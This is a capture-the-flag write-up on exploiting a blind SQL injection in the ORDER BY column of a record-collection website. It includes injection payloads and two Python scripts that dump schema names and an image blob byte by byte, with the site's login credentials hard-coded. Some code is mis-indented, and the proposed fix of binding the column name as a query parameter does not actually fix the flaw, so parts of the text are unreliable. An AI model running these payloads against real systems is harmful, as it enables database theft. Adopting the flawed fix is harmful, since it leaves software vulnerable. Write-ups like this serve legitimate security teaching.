RMB
===

Overview
--------
For this challenge, we were presented with a website where we can consult the full lavish's collection, ordered by different parameters of the releases of this collection. We can also look through different Dj Sets.
The goal of this challenge was to look for a flag that would be written on an image related to one of the favorite releases of the owner.

Vulnerability
-------------
Although we were told in the introduction of the challenge that prepared statements were used whenever possible, we were able to find a vulnerability in the endpoint *_get_releases*, as the input was not being handled.
By looking through the source code available in *rmb.py*, we can see the following lines of the function *_get_releases*:

<pre><code>
    cur = query_handler('''
        SELECT * FROM releases
        ORDER BY {} ASC
        LIMIT 10 OFFSET %s
        '''.format(col), [page*10], cur)
</code></pre>

In this website, the queries are being executed by a cursor (*cur*). This mechanism allows for the variable only to be replaced after the query is processed. Therefore, we cannot inject code in a few variables, such as in page (as we can see after OFFSET).
However, it wasn't applied for *col* in the previous function, as it is replaced in the query before the query is processed. So we can place our attack here.

Exploitation
------------
I started the development of my exploitation by finding a way to explore the previously stated vulnerability. At first glance, it seems that we don't have more options than selecting the ones available in https://rmb.is.hackthe.space/. However, after looking through the code, we can see that we can add different types of input when using url structure as : *'/_get_releases/<col>/<int:page>' and '/_get_djset/<int:set_id>'*.
Here, we can write more than the inputs initially available and, taking advantage of the vulnerability, we can write our attack where the variable col is placed in the url.

By looking once again at the code, we can observe that the attack will be placed in the following query:
<pre><code>
    SELECT * FROM releases ORDER BY {} ASC LIMIT 10 OFFSET %s
</code></pre>

My code will be placed where "{}" are.
We could guess by the structure of the query previously presented, that we will not be able to present or show the output of the query we are developing. In other words, the HTTP responses do not contain the results of our SQL query. According to this, we will have to develop a blind sql injection, as we can make some changes to the webpage depending on the response to our query, however, we can see the output itself.

I started by trying to use different attacks, and simpler ones. For example, I verified if the table *releases* didn't have any hidden columns or lines, writing the queries such as:

<pre><code>
    (CASE WHEN (SELECT count(column_name) as Number FROM information_schema.columns WHERE table_name='releases')=7 THEN year ELSE id END)

    (CASE WHEN (SELECT COUNT(*) as Number FROM releases)=549 THEN year ELSE id END)
</code></pre>

where *<col>* is in the URL.
I also tried to find out the number of Base Tables that exist, to see if there were any other tables that I could be interested in. I started by trying to guess the amount of tables there are, and reduced the number guessed, until I ended up with 3.

<pre><code>
    (CASE WHEN (SELECT count(*) as Number FROM information_schema.tables WHERE table_type LIKE 'BASE TABLE')<100 THEN year ELSE id END)

    (CASE WHEN (SELECT count(*) as Number FROM information_schema.tables WHERE table_type LIKE 'BASE TABLE')=3 THEN year ELSE id END)
</code></pre>

I concluded that we can use a query with a similar structure to this one in a script, as I wanted to automate this process. The script I used is very similar to the one presented in Materials (https://is.hackthe.space/#/materials/web-server-side-security), however some adaptations were made.
In order to determine if a guess was correct, what changed was how the releases were ordered, and as a consequence there were releases that would appear as responses to my query. I noticed that the string "[{"artist":"Various Artists"" would only appear if the condition inside the query was false, so I used this string to determine if the condition was true or false.
I would run a cycle for each char in each position of the string I wanted to obtain, until I could obtain the all string.

<pre><code>
    BASE_URL = "https://rmb.is.hackthe.space/_get_releases/"

    QUERY_LAST_TABLE = "(CASE WHEN (SELECT MID(table_name,{pos},1) FROM information_schema.tables WHERE table_type = 'BASE TABLE' AND table_name NOT LIKE 'releases' AND table_name NOT LIKE 'sets')='{char}' THEN year ELSE id END)"

    QUERY_COL_NAME = "(CASE WHEN (SELECT MID(column_name,{pos},1) FROM information_schema.columns WHERE table_name = 'artworks' AND column_name NOT LIKE 'id' AND column_name NOT LIKE 'image')='{char}' THEN year ELSE id END)"

    QUERY_IMG_SIZE = "(CASE WHEN (SELECT BIT_LENGTH(image) FROM artworks WHERE release_id = 245)={char} THEN year ELSE id END)"

    SUCCESS_MSG = "[{\"artist\":\"Various Artists\""

    def oracle(s, c, pos):
        FINAL_URL = BASE_URL+QUERY_COL_NAME.format(char=c, pos=pos)+"/0"
        r = s.get(FINAL_URL)
        return not(SUCCESS_MSG in r.text)

    def main():
        if len(sys.argv) != 2:
            sys.stderr.write('Usage: {} <position>\n'.format(sys.argv[0]))
            sys.exit(1)
    
            chars = string.ascii_letters + string.digits # printable#+ string.punctuation
            s = requests.Session()
            s.auth = ('rmb','kLMxMo8anaMRX1V9')
            for guess in chars:
                if oracle(s, guess, int(sys.argv[1])):
                print(guess)
                break

    if __name__ == '__main__':
        main()

</code></pre>

To run the previous script the command "for i in {1..100}; do ./rmb_script.py "${i}" | tr -d '\n'; done; echo" was used.

I coded different sql queries to find different information. First, I used the query *QUERY_LAST_TABLE*, to find out the name of the third base table, which was *artworks*. Additionally, I found the name of its different columns: *id*, *release_id* and *image*.
We now know, where is the PNG blob we are looking for, we just need to know the id of the release it is related to.
In the intro of the challenge we are told "dump the sleeve of one particular release he's really in love with. Flag is in the PNG blob". So, we need to find out what lavish's favorite release is. By looking through the DJ Sets there is a set called "Me Mix", in the end of that set it is written: "Apollo Two - Atlantis (I Need You) LTJ Bukem Remix (GLR 003) <- so much in love with this".

Looking through the url *https://rmb.is.hackthe.space/_get_releases/title/0*, in other words, looking through the releases order by title, in page two we can find the release previously mentioned, and see that it's id is "245".

We can now write the following query:
<pre><code>
    (CASE WHEN (SELECT CONV(HEX(SUBSTRING(image,{pos},1)),16,10) FROM artworks WHERE release_id = 245)={byte} THEN year ELSE id END)
</code></pre>

This query will allow us to read byte by byte the blob stored in *artworks* associated with *released_id* equal to 245. We will be able to transform each hexadecimal value to its equivalent decimal value and compare it with different decimal values until we find a match. We would later transform this decimal value to hexadecimal and write in a file. All this steps are coded in the following script:
<pre><code>

    BASE_URL = "https://rmb.is.hackthe.space/_get_releases/"

    QUERY_IMG = "(CASE WHEN (SELECT CONV(HEX(SUBSTRING(image,{pos},1)),16,10) FROM artworks WHERE release_id = 245)={byte} THEN year ELSE id END)"

    SUCCESS_MSG = "[{\"artist\":\"Various Artists\""

    def oracle(s, b, pos):
        FINAL_URL = BASE_URL+QUERY_IMG.format(byte=b, pos=pos)+"/0"
        #print(FINAL_URL)
        r = s.get(FINAL_URL)
        return not(SUCCESS_MSG in r.text)

    def main():
        f = open("blob.png","ab")
    
        all_combination = []
        for i in range(0,256):  
            all_combination.append(i)
    
        s = requests.Session()
        s.auth = ('rmb','kLMxMo8anaMRX1V9')
        print("start")
        for guess in all_combination:
            if oracle(s, guess, int(sys.argv[1])):
                print(str(guess)+" ")
                f.write((guess).to_bytes(1, byteorder='big', signed=False))
                break
    
    if __name__ == '__main__':
        main()

</code></pre>

The output of this last script was an image where we could find the flag.

Solution
--------
As I stated previously, the vulnerability of this webserver is an input validation vulnerability, in other words, the input of the user is not being handled. In order to correct this vulnerability, we can take advantage of the structure already used for other variables in this code. We can use the cursor to our advantage. The changes required would include:
<pre><code>
    cur = query_handler('''
        SELECT * FROM releases
        ORDER BY %s ASC
        LIMIT 10 OFFSET %s
        ''', [col, page*10], cur)
</code></pre>

This small change would allow possible code to be inputed to be handled not like code but as a string. Preventing code injection.
